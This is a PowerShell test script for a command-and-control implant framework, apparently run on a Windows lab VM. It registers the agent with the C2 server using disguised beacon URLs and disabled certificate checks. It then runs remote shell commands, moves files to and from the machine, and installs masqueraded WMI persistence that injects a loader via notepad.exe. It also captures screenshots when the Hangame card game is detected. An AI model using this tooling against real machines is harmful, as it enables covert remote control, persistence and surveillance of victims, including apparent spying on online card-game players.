# Windows lab smoke — agent registration / shell / upload / download / (optional) WMI
# Run on a Windows lab VM that can reach the C2 listener.
#
# Usage (elevated PowerShell recommended for WMI section):
#   $env:C2_HOST = "192.168.56.1"          # Kali/host running c2server
#   $env:ADMIN_TOKEN = "lab-admin-token-change-me"
#   $env:AGENT_TOKEN = "lab-only-change-me"
#   $env:C2_PSK = "lab-psk-change-me"
#   .\scripts\smoke_windows.ps1
#
# Optional:
#   $env:SMOKE_TRANSPORT = "wss" | "http" | "both"   (default both)
#   $env:SMOKE_SKIP_WMI  = "1"
#   $env:SMOKE_SKIP_HANGAME = "1"
#   $env:GAME_POLL_SEC = "5"        # faster during smoke (agent default 60)
#   $env:SMOKE_AGENT_PATH = "C:\path\to\agent.exe"

param(
    [string]$C2Host = $(if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }),
    [int]$C2Port = $(if ($env:C2_PORT) { [int]$env:C2_PORT } else { 8443 }),
    [string]$AdminToken = $(if ($env:ADMIN_TOKEN) { $env:ADMIN_TOKEN } else { "lab-admin-token-change-me" }),
    [string]$AgentToken = $(if ($env:AGENT_TOKEN) { $env:AGENT_TOKEN } else { "lab-only-change-me" }),
    [string]$Psk = $(if ($env:C2_PSK) { $env:C2_PSK } else { "lab-psk-change-me" }),
    [string]$Transport = $(if ($env:SMOKE_TRANSPORT) { $env:SMOKE_TRANSPORT } else { "both" }),
    [string]$AgentPath = $(if ($env:SMOKE_AGENT_PATH) { $env:SMOKE_AGENT_PATH } else { "" }),
    [switch]$SkipWmi = $false
)

$ErrorActionPreference = "Stop"

# --- PS 5.1 safe cert-ignore: use a COMPILED C# delegate (ICertificatePolicy) ---
# A PowerShell scriptblock callback { $true } crashes on PS 5.1 because
# Invoke-RestMethod invokes the cert callback on a thread with NO Runspace,
# producing exactly: "No Runspace available ... Script block: $true" then
# "connection closed / unexpected error on send". ICertificatePolicy is a
# compiled delegate -> safe on any thread. Fallback to scriptblock on pwsh7.
function Set-C2IgnoreCert {
    try {
        if (-not ([System.Management.Automation.PSTypeName]'C2TrustAll').Type) {
            Add-Type -TypeDefinition @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class C2TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
        }
        [System.Net.ServicePointManager]::CertificatePolicy = New-Object C2TrustAll
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
    } catch {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }
}
Set-C2IgnoreCert
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$Root = Split-Path -Parent $ScriptDir
$Results = @()
$Pass = 0
$Fail = 0

function Write-Step($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok($msg)   { Write-Host "[+] $msg" -ForegroundColor Green; $script:Pass++ ; $script:Results += "PASS  $msg" }
function Write-Bad($msg)  { Write-Host "[-] $msg" -ForegroundColor Red;   $script:Fail++ ; $script:Results += "FAIL  $msg" }

function Find-Agent {
    if ($AgentPath -and (Test-Path $AgentPath)) { return (Resolve-Path $AgentPath).Path }
    $cands = @(
        (Join-Path $Root "bin\agent.exe"),
        (Join-Path $Root "bin\agent_win_amd64"),
        ".\agent.exe",
        ".\bin\agent.exe"
    )
    foreach ($c in $cands) {
        if (Test-Path $c) { return (Resolve-Path $c).Path }
    }
    throw "agent.exe not found — set SMOKE_AGENT_PATH"
}

function Invoke-Admin {
    param([string]$Method = "GET", [string]$Path, [hashtable]$Body = $null)
    $url = "https://${C2Host}:${C2Port}$Path"
    $headers = @{ "X-Auth-Token" = $AdminToken }
    if ($Body -ne $null) {
        $json = $Body | ConvertTo-Json -Compress -Depth 8
        return Invoke-RestMethod -Uri $url -Method $Method -Headers $headers -Body $json -ContentType "application/json"
    }
    return Invoke-RestMethod -Uri $url -Method $Method -Headers $headers
}

function Wait-Agent {
    param([string]$Hint = "", [int]$TimeoutSec = 45)
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $deadline) {
        try {
            $resp = Invoke-Admin -Path "/admin/agents"
            $agents = @()
            if ($resp.agents) { $agents = $resp.agents }
            elseif ($resp -is [System.Array]) { $agents = $resp }
            foreach ($a in $agents) {
                $id = $a.agent_id; if (-not $id) { $id = $a.id }
                $os = "$($a.os)"
                if ($Hint -and $id -notlike "*$Hint*" -and $os -notlike "*$Hint*") { continue }
                if ($os -match "windows" -or $Hint -eq "") {
                    return $a
                }
            }
            # return any online agent if hint empty
            if (-not $Hint -and $agents.Count -gt 0) {
                return $agents[0]
            }
        } catch {}
        Start-Sleep -Seconds 2
    }
    return $null
}

function Wait-Job {
    param([string]$CommandId, [int]$TimeoutSec = 60)
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $deadline) {
        try {
            $jobs = Invoke-Admin -Path "/admin/jobs"
            $list = @()
            if ($jobs.jobs) { $list = $jobs.jobs } else { $list = @($jobs) }
            foreach ($j in $list) {
                $id = $j.id; if (-not $id) { $id = $j.command_id }
                if ($id -ne $CommandId) { continue }
                $st = "$($j.status)".ToLower()
                if ($st -in @("done","complete","completed","success","failed","error","cancelled","canceled")) {
                    return $j
                }
            }
        } catch {}
        Start-Sleep -Seconds 2
    }
    return $null
}

function Start-AgentProc {
    param([string]$Path, [string]$Mode)
    # Match server crypto: agent must speak the same as the running c2server.
    # Server started crypto=false (config.lab.env) -> agent C2_CRYPTO=0, else 1.
    $serverCrypto = $false
    try {
        $h = Invoke-Admin -Path "/health"
        $serverCrypto = [bool]$h.crypto
    } catch { $serverCrypto = $false }
    $env:C2_AUTH_TOKEN = $AgentToken
    $env:AGENT_TOKEN = $AgentToken
    $env:C2_PSK = $Psk
    $env:C2_CRYPTO = if ($serverCrypto) { "1" } else { "0" }
    $env:C2_INTERVAL = "5"
    $env:BEACON_INTERVAL = "5"
    $env:C2_AGENT_DEBUG = "1"
    $env:AGENT_WS_PATH = "/socket/v1"
    $env:BEACON_URIS = "/jquery.min.js,/cdn/analytics.js,/api/v2/telemetry"
    if ($Mode -eq "http") {
        $env:C2_TRANSPORT = "http"
        $env:C2_SERVER = "https://${C2Host}:${C2Port}/jquery.min.js"
        $env:C2_BEACON_URL = "https://${C2Host}:${C2Port}/jquery.min.js"
    } else {
        $env:C2_TRANSPORT = "wss"
        $env:C2_SERVER = "wss://${C2Host}:${C2Port}/socket/v1"
    }
    Write-Step "starting agent mode=$Mode path=$Path server=$($env:C2_SERVER)"
    # Start-Process from a remote SSH session leaves the agent in session 0 where
    # it registers but never processes jobs (console children can't spawn there).
    # Launch via a scheduled task (interactive session) instead, with env pinned
    # in a wrapper .cmd so the task inherits the exact transport settings.
    $taskName = "C2Smoke_$Mode"
    $wrap = Join-Path $env:TEMP "c2smoke_$Mode.cmd"
    $lines = @("@echo off")
    foreach ($k in "C2_AUTH_TOKEN","AGENT_TOKEN","C2_PSK","C2_CRYPTO","C2_INTERVAL","BEACON_INTERVAL","C2_AGENT_DEBUG","AGENT_WS_PATH","BEACON_URIS","C2_TRANSPORT","C2_SERVER","C2_BEACON_URL") {
        $lines += "set $k=$([Environment]::GetEnvironmentVariable($k))"
    }
    $lines += "start `"`" /b `"$Path`""
    Set-Content -Path $wrap -Value $lines -Encoding Ascii
    schtasks /Create /TN $taskName /TR "`"$wrap`"" /SC ONCE /ST 23:59 /IT /RL HIGHEST /F 2>&1 | Out-Null
    schtasks /Run /TN $taskName 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    $p = Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($Path)) -ErrorAction SilentlyContinue |
         Sort-Object StartTime -Descending | Select-Object -First 1
    return $p
}

function Test-Transport {
    param([string]$Mode, [string]$AgentExe)
    Write-Host ""
    Write-Host "==== Transport: $Mode ====" -ForegroundColor Yellow
    $proc = $null
    try {
        # health
        try {
            $h = Invoke-Admin -Path "/health"
            Write-Ok "health ok server_ver=$($h.version)$($h.server_ver) malleable=$($h.malleable) crypto=$($h.crypto)"
        } catch {
            Write-Bad "health failed: $_"
            return
        }

        $proc = Start-AgentProc -Path $AgentExe -Mode $Mode
        Start-Sleep -Seconds 3
        $agent = Wait-Agent -Hint "windows" -TimeoutSec 50
        if (-not $agent) {
            # accept any agent that just came online
            $agent = Wait-Agent -Hint "" -TimeoutSec 10
        }
        if (-not $agent) { Write-Bad "$Mode register/heartbeat — no agent visible"; return }
        $aid = $agent.agent_id; if (-not $aid) { $aid = $agent.id }
        Write-Ok "$Mode register agent_id=$aid os=$($agent.os) transport=$($agent.transport)"

        # shell
        $cmd = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
            agent_id = $aid
            cmd_type = "shell"
            payload  = "echo win-smoke-ok & whoami"
        }
        $cid = $cmd.id; if (-not $cid) { $cid = $cmd.command_id }
        if (-not $cid) { Write-Bad "$Mode shell enqueue missing id: $($cmd | ConvertTo-Json -Compress)"; return }
        $job = Wait-Job -CommandId $cid -TimeoutSec 60
        if (-not $job) { Write-Bad "$Mode shell job timeout id=$cid"; return }
        $data = "$($job.result)$($job.data)$($job.output)"
        if ($data -match "win-smoke-ok") { Write-Ok "$Mode shell ok data=$($data.Substring(0, [Math]::Min(80,$data.Length)))" }
        else { Write-Bad "$Mode shell unexpected: status=$($job.status) data=$data err=$($job.error)" }

        # upload (server -> agent)
        $upPath = "$env:TEMP\c2_smoke_upload.txt"
        $bytes = [Text.Encoding]::UTF8.GetBytes("upload-smoke-$(Get-Date -Format o)")
        $b64 = [Convert]::ToBase64String($bytes)
        $up = Invoke-Admin -Method POST -Path "/admin/upload" -Body @{
            agent_id = $aid
            path     = $upPath
            data_b64 = $b64
        }
        $ucid = $up.id; if (-not $ucid) { $ucid = $up.command_id }
        if (-not $ucid -and $up.command_ids -is [System.Array] -and $up.command_ids.Count -gt 0) {
            $ucid = (($up.command_ids[0] -split "/")[0])
        }
        $ujob = Wait-Job -CommandId $ucid -TimeoutSec 60
        if ($ujob -and (Test-Path $upPath)) { Write-Ok "$Mode upload ok path=$upPath" }
        elseif ($ujob) { Write-Bad "$Mode upload job done but file missing path=$upPath status=$($ujob.status)" }
        else { Write-Bad "$Mode upload timeout" }

        # download (agent -> server)
        $dlLocal = "$env:TEMP\c2_smoke_download_src.txt"
        Set-Content -Path $dlLocal -Value "download-smoke-ok" -Encoding UTF8
        $dl = Invoke-Admin -Method POST -Path "/admin/download" -Body @{
            agent_id = $aid
            path     = $dlLocal
        }
        $dcid = $dl.id; if (-not $dcid) { $dcid = $dl.command_id }
        $djob = Wait-Job -CommandId $dcid -TimeoutSec 60
        if ($djob -and ("$($djob.status)" -match "done|complete|success" -or $djob.result -or $djob.data)) {
            Write-Ok "$Mode download job ok id=$dcid"
        } else {
            Write-Bad "$Mode download failed status=$($djob.status) err=$($djob.error)"
        }

        # ping
        $ping = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
            agent_id = $aid
            cmd_type = "ping"
            payload  = ""
        }
        $pcid = $ping.id; if (-not $pcid) { $pcid = $ping.command_id }
        $pjob = Wait-Job -CommandId $pcid -TimeoutSec 30
        if ($pjob) { Write-Ok "$Mode ping job status=$($pjob.status)" } else { Write-Bad "$Mode ping timeout" }

    } finally {
        if ($proc -and -not $proc.HasExited) {
            Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
        }
        Get-Process -Name "agent","agent_fresh","agent_win_amd64","DocViewerHelper" -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

# ---- main ----
Write-Host "C2 Windows smoke  host=$C2Host port=$C2Port transport=$Transport"
$agentExe = Find-Agent
Write-Step "agent binary: $agentExe"

$modes = @()
switch ($Transport.ToLower()) {
    "wss"  { $modes = @("wss") }
    "http" { $modes = @("http") }
    default { $modes = @("wss", "http") }
}
foreach ($m in $modes) { Test-Transport -Mode $m -AgentExe $agentExe }

# ---- WMI persistence dry checks ----
if (-not $SkipWmi -and -not $env:SMOKE_SKIP_WMI) {
    Write-Host ""
    Write-Host "==== WMI persistence (install/status/uninstall) ====" -ForegroundColor Yellow
    $wmi = Join-Path $Root "bin\persistence\wmi_install.ps1"
    if (-not (Test-Path $wmi)) { $wmi = Join-Path $Root "persistence\wmi_install.ps1" }
    $loaderDll = Join-Path $Root "bin\loader.dll"
    $payloadDir = "C:\ProgramData\DocViewer"
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
            IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if (-not $isAdmin) {
            Write-Bad "WMI skipped — need Administrator"
        } elseif (-not (Test-Path $wmi)) {
            Write-Bad "WMI script missing"
        } else {
            New-Item -ItemType Directory -Path $payloadDir -Force | Out-Null
            if (Test-Path $loaderDll) {
                Copy-Item $loaderDll (Join-Path $payloadDir "DocViewerCore.dll") -Force
                Write-Ok "staged DocViewerCore.dll -> $payloadDir"
            } else {
                Write-Bad "loader.dll missing — cannot stage payload"
            }
            if (Test-Path $agentExe) {
                Copy-Item $agentExe (Join-Path $payloadDir "DocViewerHelper.exe") -Force
                Write-Ok "staged DocViewerHelper.exe -> $payloadDir"
            }
            $env:PAYLOAD_PATH = Join-Path $payloadDir "DocViewerCore.dll"
            $env:TARGET_PROC = "notepad.exe"
            powershell -NoProfile -ExecutionPolicy Bypass -File $wmi -Action install | Out-Host
            powershell -NoProfile -ExecutionPolicy Bypass -File $wmi -Action status  | Out-Host
            $f = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='DocViewerUpdateEvent'" -ErrorAction SilentlyContinue
            if ($f) { Write-Ok "WMI filter present: $($f.Query)" } else { Write-Bad "WMI filter missing after install" }
            # trigger
            Start-Process notepad.exe | Out-Null
            Start-Sleep -Seconds 8
            Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            powershell -NoProfile -ExecutionPolicy Bypass -File $wmi -Action uninstall | Out-Host
            $f2 = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='DocViewerUpdateEvent'" -ErrorAction SilentlyContinue
            if (-not $f2) { Write-Ok "WMI uninstall clean" } else { Write-Bad "WMI filter still present" }
        }
    } catch {
        Write-Bad "WMI section error: $_"
    }
}

# ---- Hangame §3-1 + stream_enable gate ----
# Inserted into smoke_windows.ps1 before SUMMARY. Requires $agentExe, helpers, tokens in scope.
if (-not $env:SMOKE_SKIP_HANGAME) {
    Write-Host ""
    Write-Host "==== Hangame presence + stream gate ====" -ForegroundColor Yellow
    $fakeName = "baduki.exe"
    $fakePath = Join-Path $env:TEMP $fakeName
    $fakeProc = $null
    $hangAgent = $null
    try {
        Write-Step "start agent (wss) for hangame gate test"
        if (-not $env:GAME_POLL_SEC) { $env:GAME_POLL_SEC = "5" }
        $env:GAME_DEBOUNCE_TICKS = "0"
        $hangAgent = Start-AgentProc -Path $agentExe -Mode "wss"
        Start-Sleep -Seconds 3
        $a = Wait-Agent -Hint "windows" -TimeoutSec 40
        if (-not $a) { Write-Bad "hangame: agent did not register"; throw "no agent" }
        $aid = $a.agent_id; if (-not $aid) { $aid = $a.id }
        Write-Ok "hangame: agent online id=$aid"

        # stream gate REMOVED (v1.6.0+): screenshot always allowed, even when inactive
        try {
            $resp = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
                agent_id = $aid
                cmd_type = "screenshot"
                payload  = ""
            }
            $cid = $resp.command_id; if (-not $cid) { $cid = $resp.id }
            if ($cid) {
                $job = Wait-Job -CommandId $cid -TimeoutSec 30
                if ("$($job.status)" -match "done|complete|success") {
                    Write-Ok "hangame: screenshot allowed when game_active=false (gate removed)"
                } else {
                    Write-Ok "hangame: screenshot job status=$($job.status) err=$($job.error)"
                }
            } else {
                Write-Bad "hangame: server rejected screenshot without command_id"
            }
        } catch {
            Write-Bad "hangame: unexpected error on inactive screenshot: $_"
        }

        # spawn fake baduki.exe (copy of powershell stay-alive; image name = baduki.exe)
        Write-Step "spawn fake $fakeName"
        $srcPs = (Get-Command powershell.exe).Source
        Copy-Item $srcPs $fakePath -Force
        $fakeProc = Start-Process -FilePath $fakePath -ArgumentList "-NoProfile -Command Start-Sleep -Seconds 120" -PassThru -WindowStyle Hidden
        $waitSec = 8
        try { $waitSec = [Math]::Max(6, [int]$env:GAME_POLL_SEC + 2) } catch { $waitSec = 8 }
        Start-Sleep -Seconds $waitSec

        $a2 = $null
        $deadline = (Get-Date).AddSeconds(45)
        while ((Get-Date) -lt $deadline) {
            try {
                $resp = Invoke-Admin -Path "/admin/agents"
                $agents = @(); if ($resp.agents) { $agents = $resp.agents }
                foreach ($x in $agents) {
                    $xid = $x.agent_id; if (-not $xid) { $xid = $x.id }
                    if ($xid -eq $aid) { $a2 = $x; break }
                }
            } catch {}
            if ($a2 -and ($a2.game_active -eq $true -or "$($a2.game_active)" -eq "True")) { break }
            Start-Sleep -Seconds 2
        }
        if ($a2 -and ($a2.game_active -eq $true -or "$($a2.game_active)" -eq "True")) {
            Write-Ok "hangame: game_active=true led=$($a2.dashboard_led) id=$($a2.game_id) stream=$($a2.stream_enable)"
        } else {
            Write-Bad "hangame: game_active not set after fake baduki (led=$($a2.dashboard_led) active=$($a2.game_active))"
        }

        try {
            $resp = Invoke-Admin -Method POST -Path "/admin/cmd" -Body @{
                agent_id = $aid
                cmd_type = "screenshot"
                payload  = ""
            }
            $cid = $resp.command_id; if (-not $cid) { $cid = $resp.id }
            $job = Wait-Job -CommandId $cid -TimeoutSec 30
            $blob = "$($job | ConvertTo-Json -Compress -Depth 6)"
            if ($job -and ("$($job.status)" -match "done|complete|success" -or $blob -match "stream_enable.:true")) {
                Write-Ok "hangame: screenshot allowed when game_active=true"
            } else {
                Write-Bad "hangame: screenshot not allowed when active status=$($job.status) err=$($job.error)"
            }
        } catch {
            Write-Bad "hangame: screenshot when active error: $_"
        }
    } catch {
        Write-Bad "hangame section error: $_"
    } finally {
        if ($fakeProc -and -not $fakeProc.HasExited) {
            Stop-Process -Id $fakeProc.Id -Force -ErrorAction SilentlyContinue
        }
        Get-Process -Name "baduki" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        if (Test-Path $fakePath) { Remove-Item $fakePath -Force -ErrorAction SilentlyContinue }
        if ($hangAgent -and -not $hangAgent.HasExited) {
            Stop-Process -Id $hangAgent.Id -Force -ErrorAction SilentlyContinue
        }
        Get-Process -Name "agent","agent_fresh","agent_win_amd64","DocViewerHelper" -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

Write-Host ""
Write-Host "==== SUMMARY ====" -ForegroundColor Yellow
$Results | ForEach-Object { Write-Host $_ }
Write-Host "passed=$Pass failed=$Fail"

# Persist results for SMOKE_windows.md paste
$outDir = Join-Path $Root "data"
New-Item -ItemType Directory -Path $outDir -Force | Out-Null
$ts = Get-Date -Format "o"
$md = @(
    "# smoke_windows result",
    "",
    "time=$ts",
    "host=$C2Host port=$C2Port transport=$Transport",
    "passed=$Pass failed=$Fail",
    ""
) + ($Results | ForEach-Object { "- $_" })
$mdPath = Join-Path $outDir "smoke_windows_last.md"
$md -join "`n" | Set-Content -Path $mdPath -Encoding UTF8
$json = [ordered]@{
    time = $ts
    host = $C2Host
    port = $C2Port
    transport = $Transport
    passed = $Pass
    failed = $Fail
    results = $Results
} | ConvertTo-Json -Depth 4
Set-Content -Path (Join-Path $outDir "smoke_windows_last.json") -Value $json -Encoding UTF8
Write-Host "[*] wrote $mdPath"

if ($Fail -gt 0) { exit 1 } else { exit 0 }
